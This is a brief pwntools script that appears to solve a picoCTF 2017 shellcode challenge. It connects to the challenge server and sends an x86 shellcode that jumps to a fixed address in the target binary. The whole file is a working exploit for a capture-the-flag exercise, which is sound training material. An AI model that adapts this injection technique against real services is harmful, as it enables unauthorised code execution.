#!/usr/bin/python
from pwn import *
import sys

# The challenge is running on x86 linux
context(arch='i386', os='linux')

server, port = "shell2017.picoctf.com", 40976

r = remote(server, port)


shellcode = "\xB8\x40\x85\x04\x08\xFF\xE0\n"

print r.recvuntil("bytes:\n")
r.send(shellcode)
print r.recv()

